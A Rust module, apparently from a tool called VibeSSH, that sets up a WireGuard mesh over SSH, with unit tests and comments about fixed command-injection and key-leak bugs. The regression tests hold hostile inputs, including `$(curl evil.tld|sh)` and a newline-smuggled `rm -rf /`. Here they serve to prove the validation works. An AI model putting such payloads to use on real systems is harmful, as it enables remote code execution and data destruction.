//! Real `wg`/`wg-quick` CLI calls over SSH exec - no WireGuard-in-Rust
//! crate, no hand-rolled key generation, nothing this module didn't ask the
//! real tool to do. Mirrors `runtime::docker`'s own split: pure,
//! independently-testable command/script construction
//! (`build_apply_script`) separated from the actual SSH exec
//! (`apply`) - see that module's own doc comment for why.
//!
//! **The private key never leaves the Node.** `ensure_keypair` only ever
//! returns the *public* key - the private key is generated with `wg genkey`
//! directly on the Node's own filesystem, and `build_apply_script` streams
//! it into the rendered config with a bare `sudo cat` piped straight into
//! the file being written. It is never named by a shell variable, never
//! captured by a command substitution, and never part of any SSH command's
//! stdout, so its plaintext content never touches this process's memory,
//! never appears in the Node's process list, and never gets logged.
//!
//! **Nothing in the generated script is expanded by the remote shell.**
//! Every caller-supplied value is a single-quoted `printf` argument, so
//! `$`, backticks and backslashes are literal bytes. This replaced an
//! earlier design that wrote peer data into an *unquoted* heredoc guarded
//! only by a newline check - which meant a compromised Node returning
//! `abc$(id)` from its own `wg pubkey` achieved code execution on every
//! other Node in the mesh at the next reconcile. See `validate_peer` and
//! `build_config_pipeline` for the two layers that now prevent it.

use crate::errors::{AppError, AppResult};
use crate::node_paths::BASE as RUNTIME_DIR;
use crate::ssh::command;
use crate::ssh::SshSession;

/// A separate, clearly-namespaced interface - never the host's own
/// pre-existing `wg0` (if any; the project's own dedicated test server
/// already runs an unrelated WireGuard mesh on `wg0` for something else
/// entirely, see the `vibessh-test-server` memory). This module must never
/// read, write, or otherwise touch anything named plain `wg0`.
pub const INTERFACE: &str = "wg-vibessh0";
/// Deliberately NOT WireGuard's own conventional default (`51820`) - a real
/// run against the project's own dedicated test server proved exactly why:
/// that host already runs an unrelated, pre-existing WireGuard interface
/// (`wg0`, for its own Minecraft-backend mesh) whose `ListenPort` is
/// `51820`, and a second interface trying to bind the same UDP port fails
/// at the kernel level (`wg-quick up` errors with a generic-looking
/// `RTNETLINK answers: Address already in use` that's actually the bind
/// conflict, not an IP-address one). Any Node already running WireGuard for
/// something else is likely to be using the conventional default too, so
/// picking a different, VibeSSH-specific port here isn't just cosmetic
/// namespacing - it's what makes joining a Node that already has its own
/// WireGuard setup actually work.
pub const LISTEN_PORT: u16 = 54221;
const PRIVATE_KEY_PATH: &str = "/etc/wireguard/vibessh-privatekey";
const CONFIG_PATH: &str = "/etc/wireguard/wg-vibessh0.conf";
/// Any table-generating provider (Vibe Network's own IPAM here) allocates
/// well inside `/16` - `/16` (not `/24`) matches
/// `storage::node_network_repository`'s own CIDR choice.
const ADDRESS_CIDR_SUFFIX: &str = "/16";

/// One other mesh member, as seen from the Node this config is being
/// rendered for - `allowed_ip` is that peer's own `/32` (a full mesh: every
/// pair connects directly, so each peer only ever routes to its own single
/// address, never a wider subnet).
pub struct Peer {
    pub public_key: String,
    pub allowed_ip: String,
    pub endpoint: String,
}

pub async fn detect(connection: &SshSession) -> AppResult<bool> {
    let output = connection.execute_command("command -v wg wg-quick >/dev/null 2>&1 && echo yes || echo no").await?;
    Ok(output.stdout.trim() == "yes")
}

/// `apt-get`-only (Ubuntu/Debian) - matches every built-in blueprint's own
/// target OS. Real, not assumed: `detect` is always checked first by the
/// caller, and this itself checks `apt-get` exists before trying to use it,
/// erroring with a clear, actionable message on any other distro rather
/// than silently doing nothing.
pub async fn install_if_missing(connection: &SshSession) -> AppResult<()> {
    if detect(connection).await? {
        return Ok(());
    }
    let has_apt = connection.execute_command("command -v apt-get >/dev/null 2>&1 && echo yes || echo no").await?;
    if has_apt.stdout.trim() != "yes" {
        return Err(AppError::InvalidInput("WireGuard isn't installed on this Node and it doesn't look like a Debian/Ubuntu host - install wireguard-tools manually first".into()));
    }
    let output = connection.execute_command("DEBIAN_FRONTEND=noninteractive sudo apt-get update -qq && sudo apt-get install -y -qq wireguard-tools").await?;
    if output.exit_code != 0 {
        let detail = output.stderr.trim();
        return Err(AppError::Connection(format!("couldn't install wireguard-tools: {}", if detail.is_empty() { "apt-get failed" } else { detail })));
    }
    Ok(())
}

/// Idempotent: reuses an already-generated key if this Node has joined
/// before (or was set up out of band), only generating a fresh one the
/// first time. Only the public key is ever returned - see this module's
/// own doc comment for why.
pub async fn ensure_keypair(connection: &SshSession) -> AppResult<String> {
    let exists = connection.execute_command(&format!("test -f {PRIVATE_KEY_PATH} && echo yes || echo no")).await?;
    if exists.stdout.trim() != "yes" {
        let generate = connection
            .execute_command(&format!("umask 077 && mkdir -p /etc/wireguard && wg genkey | sudo tee {PRIVATE_KEY_PATH} >/dev/null && sudo chmod 600 {PRIVATE_KEY_PATH}"))
            .await?;
        if generate.exit_code != 0 {
            let detail = generate.stderr.trim();
            return Err(AppError::Connection(format!("couldn't generate a WireGuard keypair: {}", if detail.is_empty() { "wg genkey failed" } else { detail })));
        }
    }
    let pubkey = connection.execute_command(&format!("sudo cat {PRIVATE_KEY_PATH} | wg pubkey")).await?;
    if pubkey.exit_code != 0 || pubkey.stdout.trim().is_empty() {
        return Err(AppError::Connection("couldn't derive the WireGuard public key".into()));
    }
    Ok(pubkey.stdout.trim().to_string())
}

// Where the one file this module materializes on the Node lives. See
// `crate::node_paths` for why it is not `/tmp`: an earlier version piped
// `wg-quick strip` into the fixed path `/tmp/vibessh-wg-strip.conf`
// through `sudo tee`, which was two vulnerabilities at once. `tee` follows
// symlinks, so any local user could pre-create that path as a link to
// `/etc/passwd` and have the next mesh reconcile overwrite it as root; and
// `wg-quick strip` output *contains the Node's WireGuard private key*,
// which `tee` wrote with the default umask - world-readable for the window
// before `rm -f`, enough for any local account to steal the key and
// impersonate the Node in the mesh.
//
// Both are closed by the combination of a root-write-only directory (no
// unprivileged user can create an entry, so no symlink can be planted) and
// `sudo mktemp`, which creates at 0600 owned by root (so no unprivileged
// user can read what lands there).

/// Every value that ends up inside the generated WireGuard config is
/// validated by *shape*, not by a character denylist. A denylist is what
/// this module used to have (`\n`, `\r`, and the heredoc's own delimiter)
/// and it was not enough: the script wrote peer data into an **unquoted**
/// heredoc, so `$(...)` and backticks were expanded by the remote shell.
/// Because a peer's `public_key` is whatever `wg pubkey` printed **on that
/// peer's own Node**, a single compromised Node could return `abc$(id)` and
/// get code execution on every other Node in the mesh the next time the
/// desktop reconciled.
///
/// `build_apply_script` no longer has any expansion context at all, so this
/// is defense in depth rather than the only barrier - but validating a
/// WireGuard key as a WireGuard key, and an endpoint as `host:port`,
/// rejects far more than any denylist can, and produces a real error
/// message instead of a confusing `wg-quick` parse failure later.
fn validate_peer(peer: &Peer) -> AppResult<()> {
    command::validate_wireguard_key(&peer.public_key, "a peer's public key")?;
    command::validate_ipv4_cidr(&peer.allowed_ip, "a peer's allowed IP")?;
    let (host, port) = peer
        .endpoint
        .rsplit_once(':')
        .ok_or_else(|| AppError::InvalidInput("a peer's endpoint must be host:port".into()))?;
    command::validate_host(host, "a peer's endpoint host")?;
    if port.parse::<u16>().is_err() {
        return Err(AppError::InvalidInput("a peer's endpoint port isn't a valid port number".into()));
    }
    Ok(())
}

/// Renders the config as a sequence of `printf` calls rather than a
/// heredoc, which is what removes the injection surface entirely: every
/// interpolated value is a single-quoted `printf` **argument**, so the
/// remote shell treats it as literal bytes and there is no context left in
/// which `$`, a backtick or a backslash means anything. A quoted heredoc
/// (`<<'EOF'`) would also have fixed the expansion bug, but it can still be
/// terminated early by a value containing the delimiter on its own line -
/// this shape has no delimiter to find.
///
/// The private key never enters a command string, an argument list, or a
/// shell variable: `sudo cat` streams it straight into the pipe that
/// becomes the config file. That also fixes a second problem with the old
/// `PRIVATE_KEY=$(sudo cat ...)` form, which briefly exposed the key in the
/// process environment. `tr -d '\n'` normalizes the key file whether or not
/// it ends with a trailing newline, so exactly one newline follows it.
fn build_config_pipeline(own_ip: &str, peers: &[Peer]) -> String {
    let mut lines = vec![
        "printf '[Interface]\\n'".to_string(),
        format!("printf 'Address = %s\\n' {}", command::quote(&format!("{own_ip}{ADDRESS_CIDR_SUFFIX}"))),
        "printf 'PrivateKey = '".to_string(),
        format!("sudo cat {} | tr -d '\\n'", command::quote(PRIVATE_KEY_PATH)),
        "printf '\\n'".to_string(),
        format!("printf 'ListenPort = %s\\n' {}", command::quote(&LISTEN_PORT.to_string())),
    ];
    for peer in peers {
        lines.push("printf '\\n[Peer]\\n'".to_string());
        lines.push(format!("printf 'PublicKey = %s\\n' {}", command::quote(&peer.public_key)));
        lines.push(format!("printf 'AllowedIPs = %s\\n' {}", command::quote(&peer.allowed_ip)));
        lines.push(format!("printf 'Endpoint = %s\\n' {}", command::quote(&peer.endpoint)));
        lines.push("printf 'PersistentKeepalive = 25\\n'".to_string());
    }
    lines.join("\n  ")
}

/// Pure script construction, separated from `apply`'s actual SSH exec so
/// the rendered shape can be unit tested without a live connection - same
/// split `runtime::docker::build_create_command` uses for the same reason.
///
/// `wg syncconf` needs a plain file argument, not a pipe - hence a temp
/// file rather than `<(...)` process substitution, specifically so this
/// script only needs POSIX `sh` semantics, not bash: which shell actually
/// runs an SSH exec command depends on the remote account's own login shell
/// (`dash` is Ubuntu's default `/bin/sh`, and it has no process
/// substitution).
fn build_apply_script(own_ip: &str, peers: &[Peer]) -> AppResult<String> {
    command::validate_ipv4(own_ip, "the Node's own mesh IP")?;
    for peer in peers {
        validate_peer(peer)?;
    }

    let config_pipeline = build_config_pipeline(own_ip, peers);
    let config_path = command::quote(CONFIG_PATH);
    let ensure_dirs = crate::node_paths::ensure_runtime_dirs_command();
    Ok(format!(
        "set -e\n\
         umask 077\n\
         sudo mkdir -p /etc/wireguard\n\
         {ensure_dirs}\n\
         {{\n  {config_pipeline}\n}} | sudo tee {config_path} >/dev/null\n\
         sudo chmod 600 {config_path}\n\
         if sudo ip link show {INTERFACE} >/dev/null 2>&1; then\n  \
         strip_conf=$(sudo mktemp {RUNTIME_DIR}/wg-strip.XXXXXX)\n  \
         sudo wg-quick strip {INTERFACE} | sudo tee \"$strip_conf\" >/dev/null\n  \
         sudo wg syncconf {INTERFACE} \"$strip_conf\"\n  \
         sudo rm -f \"$strip_conf\"\n\
         else\n  \
         sudo wg-quick up {INTERFACE}\n\
         fi\n"
    ))
}

/// Renders this Node's own full peer set and applies it - a first-time
/// call brings the interface up (`wg-quick up`); every call after that
/// live-reloads it (`wg syncconf`, no drop) rather than a down+up cycle
/// that would briefly interrupt every existing tunnel to this Node just to
/// add one new peer. Idempotent and safe to call on every membership
/// change for every member, matching the same "always re-derive and
/// re-apply the full desired set" shape `firewall_service::reconcile_node`
/// already uses.
pub async fn apply(connection: &SshSession, own_ip: &str, peers: &[Peer]) -> AppResult<()> {
    let script = build_apply_script(own_ip, peers)?;
    let output = connection.execute_command(&script).await?;
    if output.exit_code != 0 {
        let detail = output.stderr.trim();
        return Err(AppError::Connection(format!("couldn't apply the WireGuard config: {}", if detail.is_empty() { "wg-quick/wg syncconf failed" } else { detail })));
    }
    Ok(())
}

/// One peer's real, current state as `wg show ... dump` reports it -
/// `latest_handshake_unix` is a Unix timestamp (`0` = no handshake yet,
/// meaning the tunnel has never actually been used). This is genuine
/// WireGuard state, not a synthetic ping - a recent handshake is the
/// closest thing WireGuard itself has to "this peer is online."
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PeerStatus {
    pub public_key: String,
    pub latest_handshake_unix: u64,
    pub rx_bytes: u64,
    pub tx_bytes: u64,
}

/// Parses `wg show <interface> dump` - the interface's own summary line
/// (private key, public key, listen port, fwmark - 4 tab-separated fields)
/// comes first and is skipped; every line after that is one peer (public
/// key, preshared key, endpoint, allowed IPs, latest handshake, rx, tx,
/// keepalive - 8 fields).
fn parse_wg_dump(output: &str) -> Vec<PeerStatus> {
    output
        .lines()
        .skip(1)
        .filter_map(|line| {
            let fields: Vec<&str> = line.split('\t').collect();
            if fields.len() < 7 {
                return None;
            }
            Some(PeerStatus {
                public_key: fields[0].to_string(),
                latest_handshake_unix: fields[4].parse().unwrap_or(0),
                rx_bytes: fields[5].parse().unwrap_or(0),
                tx_bytes: fields[6].parse().unwrap_or(0),
            })
        })
        .collect()
}

/// This Node's own live view of its peers - real `wg show` output, not a
/// synthetic probe. Empty (not an error) if the interface doesn't exist
/// yet (this Node hasn't joined, or hasn't been reconciled since joining).
pub async fn show_peers(connection: &SshSession) -> AppResult<Vec<PeerStatus>> {
    let output = connection.execute_command(&format!("sudo wg show {INTERFACE} dump 2>/dev/null")).await?;
    if output.exit_code != 0 {
        return Ok(vec![]);
    }
    Ok(parse_wg_dump(&output.stdout))
}

/// Tears the interface down and removes its config - used both by an
/// explicit "Leave Vibe Network" action and by every real-server test's own
/// cleanup, so a Node this module touched is left with no trace once it's
/// no longer a member. Deliberately does NOT remove the keypair - a Node
/// that rejoins later should get the same public key back, not a new
/// identity every time.
pub async fn teardown(connection: &SshSession) -> AppResult<()> {
    let _ = connection.execute_command(&format!("sudo wg-quick down {INTERFACE} 2>/dev/null; sudo rm -f {CONFIG_PATH}")).await;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn peer(public_key: &str, allowed_ip: &str, endpoint: &str) -> Peer {
        Peer { public_key: public_key.to_string(), allowed_ip: allowed_ip.to_string(), endpoint: endpoint.to_string() }
    }

    /// Two syntactically valid, distinct WireGuard public keys - the shape
    /// `validate_wireguard_key` requires (44 base64 characters ending in
    /// `=`), since the tests below now exercise the real validator rather
    /// than the old newline-only denylist.
    const KEY_A: &str = "K4hV1cB0mQ2sT7nZ9xY3lJ6pR8dW5gA0fE1uI2oC3vM=";
    const KEY_B: &str = "Zq7WcN3tG8kL1yH5rX0bV6mJ4pD2sA9fU3eI7oC1nQ0=";

    #[test]
    fn build_apply_script_streams_the_private_key_from_disk_without_ever_naming_it() {
        let script = build_apply_script("10.77.0.1", &[]).unwrap();
        // Read straight into the pipe that becomes the config...
        assert!(script.contains(&format!("sudo cat '{PRIVATE_KEY_PATH}' | tr -d '\\n'")), "{script}");
        // ...never through a shell variable or command substitution, which
        // would expose it in the process environment.
        assert!(!script.contains("PRIVATE_KEY="), "{script}");
        assert!(!script.contains("$(sudo cat"), "{script}");
    }

    #[test]
    fn build_apply_script_renders_one_peer_block_per_peer_with_its_own_slash_32() {
        let script = build_apply_script("10.77.0.1", &[peer(KEY_A, "10.77.0.2/32", "203.0.113.20:51820"), peer(KEY_B, "10.77.0.3/32", "203.0.113.30:51820")])
            .unwrap();
        for (key, ip, endpoint) in [(KEY_A, "10.77.0.2/32", "203.0.113.20:51820"), (KEY_B, "10.77.0.3/32", "203.0.113.30:51820")] {
            assert!(script.contains(&format!("printf 'PublicKey = %s\\n' '{key}'")), "{script}");
            assert!(script.contains(&format!("printf 'AllowedIPs = %s\\n' '{ip}'")), "{script}");
            assert!(script.contains(&format!("printf 'Endpoint = %s\\n' '{endpoint}'")), "{script}");
        }
    }

    /// The regression test for the finding this rewrite exists for: peer
    /// data used to land in an **unquoted** heredoc, so a compromised Node
    /// returning `abc$(id)` from its own `wg pubkey` got that expanded by
    /// the shell on every *other* Node in the mesh.
    #[test]
    fn build_apply_script_rejects_command_substitution_in_every_peer_field() {
        for hostile in ["$(curl evil.tld|sh)", "`id`", "${PATH}", "a\\b"] {
            assert!(build_apply_script("10.77.0.1", &[peer(hostile, "10.77.0.2/32", "203.0.113.20:51820")]).is_err(), "public_key {hostile:?}");
            assert!(build_apply_script("10.77.0.1", &[peer(KEY_A, hostile, "203.0.113.20:51820")]).is_err(), "allowed_ip {hostile:?}");
            assert!(build_apply_script("10.77.0.1", &[peer(KEY_A, "10.77.0.2/32", hostile)]).is_err(), "endpoint {hostile:?}");
            assert!(build_apply_script(hostile, &[]).is_err(), "own_ip {hostile:?}");
        }
    }

    /// Even with every field validated, the generated script must contain
    /// no construct the remote shell would expand around caller data - no
    /// heredoc at all, and no unquoted interpolation.
    #[test]
    fn build_apply_script_has_no_heredoc_for_a_value_to_escape_from() {
        let script = build_apply_script("10.77.0.1", &[peer(KEY_A, "10.77.0.2/32", "203.0.113.20:51820")]).unwrap();
        assert!(!script.contains("<<"), "{script}");
    }

    /// The private key is the only secret on the Node this module can leak.
    /// `wg-quick strip` prints it, so wherever that output lands must be
    /// unreachable by an unprivileged local user - a fixed `/tmp` path was
    /// both world-readable and symlink-plantable.
    #[test]
    fn build_apply_script_stages_the_stripped_config_in_a_root_only_directory() {
        let script = build_apply_script("10.77.0.1", &[]).unwrap();
        assert!(!script.contains("/tmp/"), "{script}");
        assert!(script.contains(&format!("sudo install -d -o root -g root -m 755 {RUNTIME_DIR}")), "{script}");
        assert!(script.contains(&format!("sudo mktemp {RUNTIME_DIR}/wg-strip.XXXXXX")), "{script}");
        assert!(script.contains("umask 077"), "{script}");
    }

    #[test]
    fn build_apply_script_brings_the_interface_up_on_first_run_and_live_reloads_after() {
        let script = build_apply_script("10.77.0.1", &[]).unwrap();
        assert!(script.contains(&format!("wg-quick up {INTERFACE}")), "{script}");
        assert!(script.contains(&format!("wg syncconf {INTERFACE}")), "{script}");
    }

    #[test]
    fn build_apply_script_rejects_a_newline_smuggled_into_a_peer_endpoint() {
        let result = build_apply_script("10.77.0.1", &[peer(KEY_A, "10.77.0.2/32", "203.0.113.20:51820\nrm -rf /")]);
        assert!(result.is_err());
    }

    #[test]
    fn build_apply_script_rejects_a_malformed_endpoint() {
        for bad in ["203.0.113.20", "203.0.113.20:notaport", "203.0.113.20:99999", ":51820"] {
            assert!(build_apply_script("10.77.0.1", &[peer(KEY_A, "10.77.0.2/32", bad)]).is_err(), "{bad:?}");
        }
        assert!(build_apply_script("10.77.0.1", &[peer(KEY_A, "10.77.0.2/32", "node-b.example.com:51820")]).is_ok());
    }

    #[test]
    fn parse_wg_dump_skips_the_interface_summary_line_and_reads_every_peer() {
        let output = "privkeyA=\tpubkeyA=\t51820\toff\npubkeyB=\t(none)\t203.0.113.20:51820\t10.77.0.2/32\t1700000000\t1024\t2048\t25\npubkeyC=\t(none)\t203.0.113.30:51820\t10.77.0.3/32\t0\t0\t0\t25\n";
        let peers = parse_wg_dump(output);
        assert_eq!(
            peers,
            vec![
                PeerStatus { public_key: "pubkeyB=".into(), latest_handshake_unix: 1700000000, rx_bytes: 1024, tx_bytes: 2048 },
                PeerStatus { public_key: "pubkeyC=".into(), latest_handshake_unix: 0, rx_bytes: 0, tx_bytes: 0 },
            ]
        );
    }

    #[test]
    fn build_apply_script_rejects_a_public_key_that_isnt_one() {
        // The old code accepted any string without a newline here, which is
        // what let a compromised peer's `wg pubkey` output be anything at
        // all. Shape validation is what closes that.
        for bad in ["VIBESSH_WG_EOF", "", "pubkeyA=", "notakeynotakeynotakeynotakeynotakeynotakey=="] {
            assert!(build_apply_script("10.77.0.1", &[peer(bad, "10.77.0.2/32", "203.0.113.20:51820")]).is_err(), "{bad:?}");
        }
    }
}

